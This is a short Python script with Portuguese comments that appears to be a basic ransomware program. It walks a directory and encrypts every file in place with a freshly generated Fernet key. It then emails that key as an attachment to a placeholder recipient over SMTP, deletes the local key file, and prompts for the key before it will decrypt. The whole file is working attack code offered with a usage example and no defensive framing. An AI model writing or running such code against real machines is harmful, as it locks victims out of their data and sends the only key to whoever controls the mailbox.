import os
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
from cryptography.fernet import Fernet

# Função para gerar uma chave de criptografia e salvar em um arquivo
def generate_key():
    key = Fernet.generate_key()
    with open("encryption_key.key", "wb") as key_file:
        key_file.write(key)

# Função para carregar a chave de criptografia do arquivo
def load_key():
    return open("encryption_key.key", "rb").read()

# Função para enviar a chave de criptografia por e-mail
def send_key_email(key, recipient_email, sender_email, sender_password, smtp_server, smtp_port):
    # Configurar informações de e-mail
    subject = "Chave de Criptografia"
    message = "Por favor, encontre a chave de criptografia anexada a este e-mail."
    msg = MIMEMultipart()
    msg["From"] = sender_email
    msg["To"] = recipient_email
    msg["Subject"] = subject

    # Adicionar mensagem de texto ao e-mail
    msg.attach(MIMEText(message, "plain"))

    # Adicionar a chave de criptografia como anexo
    key_attachment = MIMEApplication(key, _subtype="octet-stream")
    key_attachment.add_header("content-disposition", "attachment", filename="encryption_key.key")
    msg.attach(key_attachment)

    # Enviar o e-mail
    try:
        server = smtplib.SMTP(smtp_server, smtp_port)  # Configurar servidor SMTP
        server.starttls()
        server.login(sender_email, sender_password)
        server.sendmail(sender_email, recipient_email, msg.as_string())
        server.quit()
        print("E-mail com a chave de criptografia enviado com sucesso!")
    except Exception as e:
        print("Erro ao enviar o e-mail:", str(e))

# Função para criptografar um arquivo
def encrypt_file(file_path, key):
    fernet = Fernet(key)
    with open(file_path, "rb") as file:
        file_data = file.read()
    encrypted_data = fernet.encrypt(file_data)
    with open(file_path, "wb") as file:
        file.write(encrypted_data)

# Função para descriptografar um arquivo com a chave fornecida manualmente
def decrypt_file(file_path, manual_key):
    fernet = Fernet(manual_key)
    with open(file_path, "rb") as file:
        encrypted_data = file.read()
    decrypted_data = fernet.decrypt(encrypted_data)
    with open(file_path, "wb") as file:
        file.write(decrypted_data)

# Função para criptografar todos os arquivos em um diretório
def encrypt_directory(directory_path, key):
    for root, _, files in os.walk(directory_path):
        for file_name in files:
            file_path = os.path.join(root, file_name)
            if not file_path.endswith(".key"):
                encrypt_file(file_path, key)

# Função para descriptografar todos os arquivos em um diretório com a chave fornecida manualmente
def decrypt_directory(directory_path, manual_key):
    for root, _, files in os.walk(directory_path):
        for file_name in files:
            file_path = os.path.join(root, file_name)
            if not file_path.endswith(".key"):
                decrypt_file(file_path, manual_key)

# Função para apagar o arquivo que contém a chave de criptografia
def delete_key_file():
    try:
        os.remove("encryption_key.key")
        print("Arquivo da chave de criptografia apagado com sucesso!")
    except Exception as e:
        print("Erro ao apagar o arquivo da chave de criptografia:", str(e))

# Exemplo de uso:
generate_key()  # Gere a chave de criptografia uma vez e guarde-a com segurança.

# Criptografar todos os arquivos em um diretório
directory_to_encrypt = "./pasandu/vasco"
encrypt_directory(directory_to_encrypt, load_key())

# Enviar a chave de criptografia por e-mail
recipient_email = "destinatario@email.com"
sender_email = "seu@email.com"
sender_password = "sua_senha"
smtp_server = "smtp.servidor.com"  # Configure o servidor SMTP desejado
smtp_port = 587  # Configure a porta do servidor SMTP

send_key_email(load_key(), recipient_email, sender_email, sender_password, smtp_server, smtp_port)

# Apagar o arquivo da chave de criptografia após o envio
delete_key_file()

# Perguntar ao usuário se deseja descriptografar os arquivos
decrypt_choice = input("Deseja descriptografar os arquivos? (S/N): ")
if decrypt_choice.lower() == "s":
    manual_key = input("Coloque a chave de descriptografia: ")
    decrypt_directory(directory_to_encrypt, manual_key)